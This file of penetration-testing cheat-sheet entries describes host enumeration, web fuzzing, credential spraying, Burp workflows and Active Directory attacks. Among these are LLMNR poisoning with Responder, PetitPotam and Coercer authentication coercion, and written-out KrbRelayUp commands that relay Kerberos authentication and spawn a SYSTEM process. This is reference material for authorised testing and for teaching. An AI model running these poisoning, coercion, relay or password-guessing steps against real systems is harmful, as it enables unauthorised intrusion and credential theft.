entries.description: Use HTTPie when you want readable request syntax and fast JSON replay during API or web testing.
entries.tip: HTTPie is great for replaying small auth, search, and JSON flows without writing a raw request file first.
entries.help_menu:
Why: faster to read and edit than curl when you are shaping JSON requests.
Use for: login flows, API tokens, and quick request-response comparisons.

entries.title: Show Current Directory and Files
entries.description: Run the two safest orientation commands first: print where you are, then list visible and hidden files with permissions.
entries.tip: This is the basic starting point when you land in an unfamiliar shell or directory.
entries.help_menu:
Why: pwd prevents path confusion, and ls -la shows hidden files, owners, groups, modes, sizes, and timestamps.
Look for: config files, dotfiles, backups, writable directories, and unexpected ownership.

entries.title: Find Files by Name
entries.description: Search below a starting directory for files matching a name or glob pattern. This is the everyday find shape to memorize first.
entries.tip: Use . as the start path for the current directory, and quote patterns like '*.conf' so the shell does not expand them too early.
entries.help_menu:
Why: name searches are the fastest way to locate configs, keys, backups, logs, and app files.
Parameters: <START_PATH> is where find begins, -type f keeps results to files, and -name matches the filename pattern.

entries.title: Find Directories by Name
entries.description: Search for directories with a case-insensitive pattern when you are mapping an application tree or looking for common folder names.
entries.tip: Good patterns include '*backup*', '*upload*', '*config*', '*log*', and framework-specific folder names.
entries.help_menu:
Why: directories reveal how an app is laid out before you inspect individual files.
Parameters: -type d keeps only directories, and -iname makes the pattern case-insensitive.

entries.title: Find Recently Modified Files
entries.description: List files changed recently so deployments, uploads, rotated logs, and active working directories stand out.
entries.tip: Change -mtime -7 to -mtime -1 for the last day, or use -mmin -60 for the last hour.
entries.help_menu:
Why: recent changes often point to where the application actually runs or where operators have been working.
Parameters: -maxdepth limits noise, -mtime -7 means modified in the last seven days, and -ls prints useful metadata.

entries.title: Find Large Files
entries.description: Locate large files that may be backups, dumps, archives, media, or logs worth reviewing during host baselining.
entries.tip: Raise or lower +100M depending on the host size and how noisy the result set is.
entries.help_menu:
Why: unusually large files often reveal backups, exported databases, compressed app bundles, and rotated logs.
Parameters: -size +100M matches files larger than 100 MB, and -printf makes the output sortable.

entries.title: Find Writable Directories
entries.description: Show directories the current user can write to, which helps with staging, cleanup planning, and misconfiguration review.
entries.tip: Start with a narrow path like /var/www, /opt, or the app directory before searching the whole filesystem.
entries.help_menu:
Why: writable directories tell you where you can safely create temporary files and where permissions may be too loose.
Parameters: -writable tests your current effective access, and -not -path excludes a noisy virtual filesystem.

entries.title: Find Files Owned by a User
entries.description: List files owned by a specific account so service ownership, app data, and user-controlled paths are easier to understand.
entries.tip: Try service users such as www-data, nginx, apache, postgres, mysql, or the user you landed as.
entries.help_menu:
Why: ownership patterns explain which service or user can modify each part of the application.
Parameters: -user selects the account owner, -type f keeps output to files, and -ls shows mode, owner, group, size, and path.

entries.title: Peek Through Likely Web Roots
entries.description: Quickly list files under common web-root territory without dumping the entire filesystem. Useful when you need app structure fast.
entries.tip: If the target stack is not in /var/www, try app-specific roots next.
entries.help_menu:
Why: you often only need the first few dozen files to identify framework, deployment style, and config locations.
Look for: .env files, framework folders, backup files, and public uploads.

entries.title: Review SUID Binaries
entries.description: List files with the SUID bit set so you can note possible privilege boundaries and unusual installed tooling during local enumeration.
entries.tip: Record the list first. Treat it as host context, not a license to act outside scope.
entries.help_menu:
Why: SUID binaries tell you a lot about the box, its software set, and possible trust boundaries.
Look for: uncommon binaries, third-party software, and paths outside standard OS locations.

entries.title: Search Current Tree for Obvious Secrets
entries.description: Hunt for high-signal strings in the current directory tree without pulling in a dedicated secret scanner.
entries.tip: Use this when you are already inside a code or config directory and want quick hits before heavier tooling.
entries.help_menu:
Why: catches obvious credential material, API keys, and forgotten config snippets fast.
Limitations: noisy on large trees, so narrow the path when possible.

entries.title: Show Interfaces and Addresses
entries.description: Enumerate interfaces, IPv4 and IPv6 addresses, and link state. This is the quickest way to map local network placement.
entries.tip: Always compare the interface list with routes and listening sockets so you know what the box can actually reach.
entries.help_menu:
Why: shows local addressing and extra interfaces such as VPN, Docker, bridges, or tunnel links.
Look for: secondary subnets, management VLANs, and interface names that hint at cloud or container roles.

entries.title: Show Routing Table
entries.description: Print the effective routing table so you can see default gateways, internal subnets, and whether the host can pivot toward other networks.
entries.tip: Routes often reveal segments that never show up in DNS or the app itself.
entries.help_menu:
Why: tells you where packets will actually go from this host.
Look for: non-default internal routes, VPN paths, and routes to management or backup networks.

entries.title: Sort Processes by Memory Usage
entries.description: See which applications are actually doing work on the box. Helpful when you need to spot web stacks, agents, databases, or noisy security tooling.
entries.tip: Memory-heavy processes are often the quickest clue to what really matters on the host.
entries.help_menu:
Why: surfaces the processes that are easiest to notice first.
Look for: Java apps, app servers, backup agents, scanners, EDR, and custom binaries running from odd paths.

entries.title: Identity, Kernel, and Hostname
entries.description: Fast first-pass host triage: confirm the current user, groups, kernel build, architecture, and hostname before you do anything deeper.
entries.tip: Good opener after you land on a Linux host or when you need a clean note heading fast.
entries.help_menu:
Why: confirms who you are, what kernel you are sitting on, and how the host names itself.
Look for: interesting groups, container hints, old kernels, and hostnames that reveal environment roles.

entries.title: List Listening Services
entries.description: Identify listening TCP and UDP services with process context. Useful for spotting internal-only apps and high-value management ports.
entries.tip: Pair this with ip route and systemctl output for a fast local service map.
entries.help_menu:
Why: ss is fast, default on modern Linux, and shows sockets plus PIDs.
Look for: localhost-only admin panels, odd high ports, and services bound to private interfaces.

entries.title: List Running Services
entries.description: Dump the active services managed by systemd. This helps you connect process names, service units, and startup behavior.
entries.tip: Great for mapping how an application stack is assembled on the host.
entries.help_menu:
Why: systemctl gives you clean service names and states faster than reading process trees alone.
Look for: custom unit names, web stacks, databases, schedulers, and agent services.

entries.title: Proxy a Browser Session Cleanly
entries.description: Capture the application once, then keep intercept off and use the proxy history as your canonical record of requests and responses.
entries.command: Run Burp Suite -> set browser proxy to 127.0.0.1:8080 -> turn Intercept off -> use HTTP history as your source of truth
entries.tip: A clean history view is better than random manual notes when you circle back to an endpoint later.
entries.help_menu:
Why: nearly every web testing step gets easier once requests are captured cleanly.
Look for: repeating endpoints, auth transitions, and hidden parameters.

entries.title: Save a Raw Request for CLI Reuse
entries.description: Store an authenticated request in a file so ffuf, sqlmap, or other CLI tools can replay the same headers, cookies, and body.
entries.command: Save the target request to request.txt so you can replay the exact headers, body, and cookies from the CLI
entries.tip: This small step removes a huge amount of manual drift between browser testing and command-line tooling.
entries.help_menu:
Why: raw requests let CLI tooling inherit your browser session cleanly.
Use for: authenticated fuzzing, SQLMap, and replaying multipart uploads.

entries.title: Send Interesting Requests to Repeater
entries.description: Move one captured request into Repeater and change a single value at a time so you can see stable behavior differences.
entries.command: Proxy -> HTTP history -> right click request -> Send to Repeater -> compare responses while changing one input at a time
entries.tip: Repeater is where most manual validation gets trustworthy.
entries.help_menu:
Why: manual diffing beats spraying the target when you are still learning the request shape.
Use for: auth flow checks, injections, header experiments, and replaying uploads.

entries.title: Launch ZAP for Local Proxying
entries.description: Start ZAP on the loopback interface when you want a free proxy-driven workflow or automation hooks.
entries.tip: Useful when you want open tooling or quick active-scan experiments in a lab-safe workflow.
entries.help_menu:
Why: ZAP gives you an alternative proxy and automation platform.
Use for: browser proxying, scripts, and light automation.

entries.title: Get the Computer Name
entries.description: Grab the local hostname quickly so your notes and screenshots stay anchored to the right target.
entries.tip: Small command, big value. It prevents messy notes later.
entries.help_menu:
Why: gives you the simplest system label fast.
Use with: `whoami /all`, `systeminfo`, and `ipconfig /all` to build a clean host summary.

entries.title: Show Full Network Configuration
entries.description: Print adapters, IP addresses, DNS servers, suffixes, and DHCP state. Great for understanding domain placement and reachable networks.
entries.tip: DNS suffixes and extra adapters often reveal internal naming and segmentation immediately.
entries.help_menu:
Why: shows how the workstation or server is connected and where it resolves names.
Look for: multiple NICs, domain suffixes, internal DNS, VPN adapters, and static routes.

entries.title: Check the Local Administrators Group
entries.description: List members of the built-in Administrators group to understand local admin reach and nested identities.
entries.tip: Especially useful on servers where delegated admin groups are common.
entries.help_menu:
Why: tells you which users or groups control the host.
Look for: domain groups, helpdesk groups, and non-standard service accounts with local admin.

entries.title: Enumerate Local Users
entries.description: List local user accounts with the classic `net` command family. Good for fast human-readable host context.
entries.tip: Useful even on older systems where some newer PowerShell modules are missing.
entries.help_menu:
Why: quick local account inventory from CMD.
Look for: disabled admin copies, service accounts, and naming patterns tied to applications.

entries.title: List Shared Resources
entries.description: Show local SMB shares published by the host. Useful for spotting admin shares, app data shares, and unexpected file exposure.
entries.tip: Compare the share list with listening ports and business function before you touch it.
entries.help_menu:
Why: quick local view of what this host is serving over SMB.
Look for: custom data shares, install paths, backup shares, and overly broad names.

entries.title: Listening Ports with PIDs
entries.description: Map open ports to process IDs so you can spot remote-management surfaces, local-only services, and unusual listeners.
entries.tip: Follow up with tasklist or PowerShell when you need to resolve a suspicious PID.
entries.help_menu:
Why: gives you the classic Windows view of active sockets.
Look for: WinRM, RDP, database ports, localhost-only admin services, and odd high ports.

entries.title: List Running Services
entries.description: Enumerate services that are currently running so you can focus on active server roles instead of dormant service entries.
entries.tip: This is a good complement to `tasklist /svc` when you need service-first context.
entries.help_menu:
Why: surfaces active service roles with clean object output.
Look for: IIS, MSSQL, backup agents, EDR, and custom service names.

entries.title: PowerShell View of Local Admins
entries.description: Show the members of the local Administrators group with PowerShell so you can script around the result if needed.
entries.tip: This is often cleaner than parsing `net localgroup administrators` output.
entries.help_menu:
Why: structured output for local group membership.
Look for: domain groups, service accounts, and nested identities that imply delegated admin.

entries.title: PowerShell View of Local Users
entries.description: List local users with the LocalAccounts module for a cleaner, scriptable alternative to `net user`.
entries.tip: Great when you want object output you can sort, filter, or export later.
entries.help_menu:
Why: object-oriented output is easier to automate and clean up than raw CMD text.
Use when: PowerShell is available and you want structured follow-up queries.

entries.title: Show Listening TCP Connections
entries.description: Use modern PowerShell networking cmdlets to list listening sockets and the owning process IDs.
entries.tip: Useful on newer Windows builds where you want cleaner filtering than `netstat` provides.
entries.help_menu:
Why: structured socket data is easier to filter and export.
Use with: `Get-Process -Id <PID>` when you need to resolve an owner quickly.

entries.title: Validate Remote Port Reachability
entries.description: Test whether a remote host is reachable on a specific port without jumping straight into a full scan.
entries.tip: Nice low-friction check from a Windows host before you escalate into heavier tooling.
entries.help_menu:
Why: lightweight path validation from the host you are on.
Use when: you need to confirm access to SMB, WinRM, RDP, or database ports without a scanner.

entries.title: Enumerate Scheduled Tasks Verbosely
entries.description: Pull a verbose list of scheduled tasks. Great for understanding maintenance jobs, custom automation, and persistence-like noise.
entries.tip: The verbose mode is noisy but worth it when you need owner, action, and next-run context.
entries.help_menu:
Why: scheduled tasks often reveal custom scripts, backup jobs, and maintenance paths.
Look for: non-standard task actions, network paths, and tasks running as privileged accounts.

entries.title: System Build and Patch Snapshot
entries.description: Collect OS version, install date, memory, domain context, and hotfix information from a single command.
entries.tip: Save raw output. It is one of the easiest ways to timestamp your host notes.
entries.help_menu:
Why: fast build and domain context without opening GUI tools.
Look for: OS version, patch age, domain membership, boot time, and installed hotfixes.

entries.title: Processes Mapped to Services
entries.description: Show running processes and any services hosted inside them. Useful for spotting server roles and EDR without opening Process Explorer.
entries.tip: Very handy on hosts where PowerShell logging or EDR makes deeper tooling noisy.
entries.help_menu:
Why: ties processes to service names so svchost-heavy systems make more sense.
Look for: databases, IIS, backup agents, EDR, and custom app services.

entries.title: Current Identity and Privileges
entries.description: Show the current Windows identity, group memberships, integrity level, and enabled privileges in one shot.
entries.tip: This is the Windows equivalent of your first Linux `id` pass. Run it early and save it.
entries.help_menu:
Why: confirms who you are and what the token can do.
Look for: local admin membership, high integrity, SeImpersonatePrivilege, and unexpected service accounts.

entries.title: Save Structured HTTPX Output
entries.description: Probe your host list and keep the enriched results as JSONL so titles, codes, technologies, and URLs are easy to filter later.
entries.tip: JSONL is one of the most useful formats in a modern web recon pipeline.
entries.help_menu:
Why: structured output lets you extract exactly the fields you care about later.
Use when: you want clean handoff into jq, screenshots, or nuclei.

entries.title: Extract URLs from HTTPX JSONL
entries.description: Pull the live URL field out of httpx JSONL output so you can feed it straight into crawlers, scanners, or screenshot tooling.
entries.tip: jq turns bulky structured data into exactly the next input file you need.
entries.help_menu:
Why: `jq` is perfect for reducing JSONL into clean target lists.
Use when: you want a reusable `live-urls.txt` for tools like nuclei or katana.

entries.title: Browse the Discovery Wordlists Installed on Kali
entries.description: Quickly peek through the installed SecLists discovery paths so you can choose a wordlist that matches the target and time budget.
entries.tip: The right wordlist size is usually more important than the fanciest tool.
entries.help_menu:
Why: SecLists is still the default wordlist source for many workflows.
Use when: you need to pick a directory, DNS, or parameter list quickly from a known location.

entries.title: Chain Passive Recon Into Live Probing
entries.description: Turn passive discovery into a validated live-host list with a short, readable pipeline you can rerun later.
entries.tip: Small pipelines like this are easier to trust and explain than giant one-liners.
entries.help_menu:
Why: passive results matter more once you validate them.
Save the output so later tools can start from live targets instead of guesses.

entries.title: Create a Clean Recon Workspace
entries.description: Start every assessment with a predictable folder layout so raw output, processed data, screenshots, and notes do not get mixed together.
entries.tip: Simple structure beats clever structure when you are tired and moving fast.
entries.help_menu:
Why: clean output structure makes it much easier to prove work and revisit it later.
Suggested use: keep raw command output separate from cleaned, deduped lists.

entries.title: Normalize and Deduplicate Lists
entries.description: Merge multiple files and remove duplicates so the next stage of tooling is not wasting time on repeats.
entries.tip: Deduping early saves time, bandwidth, and confusion everywhere else.
entries.help_menu:
Why: every recon workflow gets cleaner once duplicates are gone.
Use when: you combine passive, brute-force, crawler, or archive results.

entries.title: Save Output While Keeping It On Screen
entries.description: Capture command output to a file and still see it in real time. Great for passive recon, subdomain runs, and one-liners you want to preserve.
entries.tip: If it matters, save it the first time instead of rerunning it later.
entries.help_menu:
Why: `tee` keeps your terminal flow while also writing the evidence file.
Use when: a command produces a list you know you will reuse.

entries.title: Review Cookies and Storage for Auth Clues
entries.description: Inspect cookie flags and client-side storage to see how the app handles sessions, refresh tokens, and local identity state.
entries.command: Check Secure, HttpOnly, SameSite, cookie scope, refresh tokens, and app state stored in local or session storage
entries.tip: This is often where you find trust assumptions the server side never meant to expose.
entries.help_menu:
Why: auth state frequently leaks into the browser.
Look for: long-lived refresh tokens, role flags, insecure cookie scope, and client-only trust decisions.

entries.title: Calibrate the Failure Signal First
entries.description: Record the exact redirect, body length, message, and account behavior for failed logins before you automate anything.
entries.command: Identify the exact failure message, status code, redirect, body length, and lockout behavior before you automate anything
entries.tip: This is the difference between a trustworthy auth test and noisy guessing.
entries.help_menu:
Why: brute-force tooling is only as good as the failure signal you feed it.
Look for: lockouts, CAPTCHA, IP-based controls, and timing changes.

entries.title: Compare Auth Flow Branches
entries.description: Map the login, logout, reset, MFA, remember-me, and token-refresh flows before you make any assumptions about trust boundaries.
entries.command: Map login, logout, password reset, MFA, remember-me, and session rotation flows before you test the edge cases
entries.tip: Most auth findings come from branch logic and token handling, not from the primary login POST alone.
entries.help_menu:
Why: broken auth hides in the transitions between states.
Look for: missing rotation, mixed privilege states, and weak reset or refresh logic.

entries.title: Spray a Password Against One Username
entries.description: Swap only the password value and filter on size so you can look for unusual responses without a heavier brute-force framework.
entries.tip: ffuf is handy when you already have a reliable request and just need simple one-field fuzzing.
entries.help_menu:
Why: sometimes a normal fuzzing workflow is enough for auth testing.
Filter on: size, words, lines, and status code once you know the baseline failure response.

entries.title: Check SSH Credentials Carefully
entries.description: Validate a focused username and password set against SSH without starting with aggressive concurrency.
entries.tip: Keep threads low until you understand latency, banners, and server-side throttling.
entries.help_menu:
Why: online guessing should stay narrow and evidence-driven.
Use for: lab validation or tightly scoped service checks.

entries.title: Test a Web Form Login
entries.description: Replay a normal login request against a wordlist once you know the exact failure condition and lockout behavior.
entries.tip: Always validate the failure marker first. A bad marker makes every result worthless.
entries.help_menu:
Why: Hydra can replay simple form logins quickly when the response pattern is stable.
Check before use: redirects, body length, lockout logic, and rate limits.

entries.title: Decode and Inspect a JWT Fast
entries.description: Dump a token structure quickly so you can review the header, claims, expiry, and signing metadata before deeper testing.
entries.tip: Start with inspection. A surprising claim set often points you toward the real weakness.
entries.help_menu:
Why: JWT work starts with understanding the token model.
Review: alg, kid, aud, exp, sub, role-like claims, and issuer context.

entries.title: Probe Weak JWT Verification
entries.description: Test common JWT handling weaknesses only after you understand how the application expects the token to be used.
entries.tip: Use this deliberately. You need the token flow and acceptance point mapped first.
entries.help_menu:
Why: weak verification sometimes turns a token from identity proof into user-controlled state.
Confirm: where the token is accepted, refreshed, and revalidated.

entries.title: Recursive Path Discovery with dirsearch
entries.description: Run dirsearch when you want a familiar, actively maintained recursive path scanner with flexible extension handling.
entries.tip: dirsearch is useful when you want a second pass to compare against ffuf or Feroxbuster.
entries.help_menu:
Why: dirsearch is a strong alternative for recursive content discovery.
Use when: you want another scanner to validate or expand path findings.

entries.title: Recursive Content Discovery
entries.description: Use Feroxbuster when you want aggressive, recursive web content discovery that follows directories automatically.
entries.tip: Feroxbuster shines when you want recursion to do more of the work for you.
entries.help_menu:
Why: Feroxbuster is strong for recursive path discovery with useful defaults.
Use when: you want deeper automated walking of directory trees.

entries.title: Add Common Extensions
entries.description: Search for file-backed content by appending likely extensions to each candidate path during the fuzzing pass.
entries.tip: Extension fuzzing is excellent for backup files and framework-specific endpoints.
entries.help_menu:
Why: extensions surface scripts, text files, backups, and accidental archives.
Use when: the stack suggests file-backed routes or you suspect backup exposure.

entries.title: Directory Baseline with a Strong Wordlist
entries.description: Run a practical content discovery pass against a web root using a mid-sized SecLists-style wordlist and a simple status filter.
entries.tip: This is the basic ffuf command almost every web assessment deserves.
entries.help_menu:
Why: fast directory fuzzing is still one of the highest-value web recon steps.
Tip: choose the wordlist size to match the target and time budget.

entries.title: Directory Fuzzing with Auto-Calibration
entries.description: Use ffuf auto-calibration to learn baseline responses and reduce false positives on noisy applications.
entries.tip: When a target returns soft-404 pages everywhere, `-ac` is often the difference between useful and useless.
entries.help_menu:
Why: auto-calibration helps ffuf understand the target's normal miss behavior.
Use when: everything looks valid and you need better filtering.

entries.title: Fuzz with a Saved Raw Request
entries.description: Replay a raw request file through ffuf when cookies, methods, headers, or body structure matter to the application behavior.
entries.tip: This is the move when the target only behaves correctly with a real captured request.
entries.help_menu:
Why: raw requests preserve headers, cookies, and request shape.
Use when: you need authenticated or stateful fuzzing that a simple URL alone cannot express.

entries.title: Parameter Name Discovery
entries.description: Fuzz likely parameter names against a known endpoint to find hidden knobs and undocumented inputs.
entries.tip: This works best after you already know the app has a real endpoint to hang the parameter on.
entries.help_menu:
Why: hidden parameters are common on legacy or framework-heavy apps.
Use when: you have a stable endpoint and a good baseline response to filter against.

entries.title: Save ffuf Results as JSON
entries.description: Write ffuf output to JSON so you can review, diff, or feed results into follow-up tooling without scraping terminal output.
entries.tip: If you care about repeatability, save the JSON every time.
entries.help_menu:
Why: saved output makes it easier to compare runs and build evidence.
Use when: you expect to revisit the target or summarize findings later.

entries.title: Virtual Host Discovery
entries.description: Fuzz the Host header to find name-based virtual hosts sitting behind the same IP or reverse proxy.
entries.tip: Measure one known-bad baseline first so the size filter means something.
entries.help_menu:
Why: name-based virtual hosts often hide extra apps without separate IPs.
Filter carefully with `-fs`, `-fw`, or `-ac` so you do not drown in false positives.

entries.title: DNS Wordlist Brute Force
entries.description: Use Gobuster in DNS mode to test candidate subdomain names against a target domain with a known-good wordlist.
entries.tip: Good when you want a second brute-force engine after passive discovery and validation.
entries.help_menu:
Why: DNS mode is handy for quick wordlist-based subdomain checks.
Use after: passive enumeration so you are expanding a surface, not guessing blindly.

entries.title: Quick Directory Brute Force
entries.description: Run Gobuster for straightforward directory brute force with common extensions against a known web target.
entries.tip: Gobuster is simple, familiar, and still worth keeping in the kit.
entries.help_menu:
Why: Gobuster remains a clean option for direct brute-force path checks.
Use when: you want a compact CLI with minimal ceremony.

entries.title: Guess Hidden Parameters from Real Burp Traffic
entries.description: Use Param Miner against a meaningful request to discover hidden headers, cookies, and parameters that the application supports but never advertises.
entries.command: In Burp, right-click a request and run Param Miner to guess params, cookies, or headers against that request
entries.tip: Run it against requests that already matter, not random static assets, so the discovered inputs have a better chance of changing behavior.
entries.help_menu:
Why: hidden inputs often unlock cache behavior, internal features, auth branches, or alternate code paths.
Review response diffs carefully before treating a discovered name as meaningful.

entries.title: Inspect DOM Sinks and Web Messages in Burp Browser
entries.description: Enable DOM Invader in Burp's browser when the app is heavily client-side and you need faster visibility into DOM XSS, postMessage, or prototype pollution behavior.
entries.command: Use Burp browser DevTools -> DOM Invader to inspect controllable sinks, web messages, and prototype-pollution gadgets on the page
entries.tip: Drive a real authenticated flow while it is enabled so the client-side logic you care about is actually loaded.
entries.help_menu:
Why: DOM issues often hide in loaded client logic and message flows rather than raw responses.
Use the stack traces and sink context to move from signal to a reproducible exploit path.

entries.title: Filter URL Candidates by Pattern
entries.description: Pass a URL list through gf patterns so you can narrow large archives into smaller problem-specific candidate sets.
entries.tip: Pattern filters are a triage tool, not proof. Use them to shrink the review set.
entries.help_menu:
Why: a smaller, themed candidate list is easier to validate properly.
Use for: XSS, SSRF, redirect, or debug-style URL patterns.

entries.title: Launch a Request Smuggling Probe from a Known-Good Request
entries.description: Use the HTTP Request Smuggler extension once you have a stable request path worth testing for parser discrepancies and desync behavior.
entries.command: In Burp, right-click a suitable request and choose 'Launch Smuggle probe' in HTTP Request Smuggler
entries.tip: Keep notes on which front-end path, protocol version, and endpoint shape produced the finding because desync results are environment-specific.
entries.help_menu:
Why: request smuggling needs rooted parser context, not random spraying.
Watch for parser discrepancies, timeout confirmation, and whether exploitation requires Turbo Intruder follow-up.

entries.title: Baseline Web Misconfiguration Sweep
entries.description: Run a quick Nikto pass against a web target for common misconfigurations, dangerous files, and known weak server patterns.
entries.tip: Treat Nikto output as leads to verify, not final truth.
entries.help_menu:
Why: Nikto still works well as a fast baseline check for classic web issues.
Use when: you want quick coverage for obvious files, headers, and server misconfigs.

entries.title: Run a Focused Web Tag Sweep
entries.description: Use a constrained tag set when you want coverage for common web exposures without turning the run into a full crawl.
entries.tip: Short, themed runs are easier to validate and far easier to explain in notes later.
entries.help_menu:
Why: targeted tag sets create faster, cleaner scans.
Keep the run focused on confirmed live URLs and validate any interesting hit manually.

entries.title: Run a Templated Scan on Confirmed Live URLs
entries.description: Scan validated live URLs with community-maintained nuclei templates at a modest rate to surface common exposures and weak points.
entries.tip: Run nuclei after validation, not before. Better inputs make better findings.
entries.help_menu:
Why: nuclei is powerful when you feed it high-quality live targets.
Use when: you want broad template coverage after the basic recon and fingerprinting pass.

entries.title: Replay Archived URLs with a Marker
entries.description: Swap all parameter values in a URL list with one marker so you can look for reflection and general input handling quickly.
entries.command: cat urls.txt | qsreplace marker | httpx -silent -mc all
entries.tip: This is a lightweight way to turn historical URLs into validation candidates.
entries.help_menu:
Why: archived URLs are only useful if you can replay them consistently.
Use with: waybackurls, gau, or other archive sources.

entries.title: Check a Drupal Surface Quickly
entries.description: Run Droopescan against a Drupal target when you want a quick look at versions, modules, and likely exposure points.
entries.tip: Good fit once the fingerprinting phase already points strongly at Drupal.
entries.help_menu:
Why: common apps have known structural patterns worth enumerating directly.
Use for: Drupal surface review after stack confirmation.

entries.title: Baseline a Joomla Target
entries.description: Switch to Joomscan when the stack points to Joomla so you can get focused findings instead of generic noise.
entries.tip: A quick app-family check can save a lot of wasted fuzzing later.
entries.help_menu:
Why: app-aware tooling gives you better coverage on common stacks.
Use after: confirming the CMS or seeing strong framework clues.

entries.title: Enumerate WordPress Users and Plugins
entries.description: Use WPScan when the target is clearly WordPress and you need fast user, plugin, theme, and configuration visibility.
entries.tip: Once the CMS is known, purpose-built tooling usually beats generic scans.
entries.help_menu:
Why: common apps reward app-specific tooling.
Use for: plugins, themes, users, and config clues on WordPress targets.

entries.title: Watch Name-Resolution Traffic Before You Poison
entries.description: Run Responder in analyze mode first so you can confirm which hosts, protocols, and naming mistakes actually exist before you answer anything on the wire.
entries.tip: Analyze mode gives you the context you need to justify a narrower poisoning or relay step instead of turning everything on immediately.
entries.help_menu:
Why: passive monitoring tells you whether LLMNR, NBT-NS, mDNS, or DHCPv6 traffic is even worth touching.
Use before: active poisoning, relays, or capture-only runs.

entries.title: Start Standard LLMNR and NBT-NS Poisoning
entries.description: Answer local broadcast name-resolution traffic and expose the built-in rogue services when you have a scoped reason to capture or relay NTLM authentication.
entries.tip: Treat this as part of a relay workflow, not a background default. Capture what you need, then shut it down and document the hosts that talked to you.
entries.help_menu:
Why: this is the classic quick path to prove broadcast name-resolution exposure and collect authentication material.
Pair with: relay listeners, a crack queue, or evidence notes that name the speaking hosts.

entries.title: Dry-Run Pretender Before Taking Over Name Resolution
entries.description: Observe DHCPv6, mDNS, LLMNR, and NetBIOS name-resolution traffic without answering it so you can choose a lower-noise relay position first.
entries.tip: Pretender is strongest when you know exactly which naming paths matter and which hosts you should leave alone.
entries.help_menu:
Why: dry mode gives you the same environment feel without changing network behavior yet.
Use before: DHCPv6 takeover, relay prep, or selective spoofing rules.

entries.title: Point Pretender at a Separate Relay Host
entries.description: Run Pretender as the network sidekick while relaying to a different box that is hosting ntlmrelayx or krbrelayx.
entries.tip: Split the spoofing and relay roles only when it makes the operation cleaner. It adds moving pieces, so record both hosts clearly.
entries.help_menu:
Why: this lets you keep network poisoning and relay tooling on different systems without losing the attack path.
Pair with: ntlmrelayx.py or krbrelayx on the relay host, plus IPv6-aware listener settings.

entries.title: Trigger EFSRPC Authentication with a Random Method
entries.description: Coerce a host to authenticate to your listener over a UNC path using the PetitPotam implementation that rotates through supported methods when you do not need to pin one yet.
entries.tip: The listener path matters as much as the target. Use a hostname the victim can treat as trusted if you need more than anonymous fallback.
entries.help_menu:
Why: this is a quick way to validate whether EFSRPC coercion is still a realistic trigger path in the environment.
Pair with: ntlmrelayx.py, Responder, or an ADIDNS/NetBIOS listener name the target will resolve cleanly.

entries.title: Force a Specific PetitPotam Method
entries.description: Pin PetitPotam to one EFSRPC method when you are reproducing a finding or comparing which trigger path still works against the target.
entries.tip: When you prove one method reliably, capture that exact method name in your notes so the relay path is easier to explain later.
entries.help_menu:
Why: forcing the method removes randomness from the test and makes a repeatable proof much easier.
Use when: one method survives patching or defensive changes and you need to show that specific path.

entries.title: Scan a Host for RPC-Based Coercion Paths
entries.description: Enumerate the RPC coercion surface on a target before you try to trigger authentication so you know which protocols and methods are even in play.
entries.tip: Scan mode helps you trade guessing for evidence. Save the results before you decide whether a coercion path is worth exploiting.
entries.help_menu:
Why: scan mode gives you a broader map of coercion opportunities than a single point exploit.
Use for: triage, host selection, and documenting which protocols expose an auth trigger path.

entries.title: Trigger a Focused RPC Coercion Attempt
entries.description: Use Coercer in exploit mode when you already know the relay listener and want to narrow the trigger down to a specific method family.
entries.tip: Filtering the method name keeps your test narrower and makes it much easier to explain which RPC path caused the authentication.
entries.help_menu:
Why: this turns the broad coercion surface into a scoped, repeatable proof against one host and one listener.
Pair with: ntlmrelayx.py or Responder and notes about the exact method or protocol filter you used.

entries.title: Prepare the KrbRelayUp RELAY Phase with RBCD
entries.description: Kick off the first KrbRelayUp phase to coerce local machine authentication and turn a successful Kerberos relay into an RBCD control primitive.
entries.command: KrbRelayUp.exe relay -d corp.local -dc dc01.corp.local -c -cn ATTACKBOX$ -m rbcd
entries.tip: This path depends on domain assumptions such as LDAP signing and machine-account creation rights. Note the prerequisites alongside the command.
entries.help_menu:
Why: RELAY is the setup phase that turns local machine authentication into a reusable control primitive.
Use when: you have confirmed the target domain assumptions and want a single wrapper instead of stitching the chain together by hand.

entries.title: Run the KrbRelayUp SPAWN Phase with Shadow Credentials
entries.description: Use the stored control primitive to request a privileged service ticket and create a SYSTEM service after a successful shadow-credential setup.
entries.command: KrbRelayUp.exe spawn -d corp.local -dc dc01.corp.local -m shadowcred -i Administrator -ce machine.pfx -cep "PfxPassw0rd!" -sc "cmd.exe /c whoami /all > C:\Windows\Temp\krbrelayup.txt"
entries.tip: Only move into SPAWN once you know which account you plan to impersonate and what proof command you actually need to run as SYSTEM.
entries.help_menu:
Why: SPAWN is the execution step that converts the relay control path into local privileged code execution.
Record the impersonated user, certificate material, and output path so the action stays reviewable.

entries.title: Fingerprint a CMS Family Broadly
entries.description: Use CMSeeK when the target looks CMS-backed but WordPress, Joomla, or Drupal is not confirmed yet.
entries.tip: Use this as a routing tool: once the CMS is clear, switch to the focused scanner and manual checks for that platform.
entries.help_menu:
Why: HTB common-app labs reward recognizing the product family early.
Use after: basic HTTP fingerprinting and before app-specific scanners.

entries.title: Enumerate WordPress with Vulnerability Metadata
entries.description: Add the WPScan API token when you want plugin, theme, and core findings correlated with WPScan vulnerability data.
entries.tip: The token enriches results; you still need to confirm version reachability and exploitability manually.
entries.help_menu:
Why: the HTB WordPress sections lean on plugin/theme/user visibility.
Record: exact plugin version, theme version, and the evidence URL for each claim.

entries.title: Enumerate Joomla Components
entries.description: Use component enumeration when Joomla is confirmed and extension surface matters more than generic web fuzzing.
entries.tip: Treat component names as leads for manual URL checks, version confirmation, and public exploit triage.
entries.help_menu:
Why: Joomla extension exposure is usually where the interesting risk lives.
Follow with: searchsploit, Nuclei, and manual route review.

entries.title: Search Public Exploits by Product Version
entries.description: Map a confirmed application name and version to local Exploit-DB entries before you choose any exploit path.
entries.tip: Read the code and affected-version notes before running anything. Search results are leads, not proof.
entries.help_menu:
Why: common app modules often hinge on recognizing a vulnerable product/version.
Use when: fingerprinting gives you a reliable version or CVE candidate.

entries.title: Correlate SearchSploit with Nmap XML
entries.description: Let SearchSploit inspect saved Nmap XML when you want a quick public-exploit triage pass over discovered service versions.
entries.tip: This is a triage shortcut. Keep the original scan and manually review any exploit that looks relevant.
entries.help_menu:
Why: version banners from Nmap are a natural input to public exploit lookup.
Watch for: false positives caused by vague service names.

entries.title: Check IIS Short Name Disclosure
entries.description: Use Nmap’s IIS short-name brute script as a first pass before moving to a dedicated scanner.
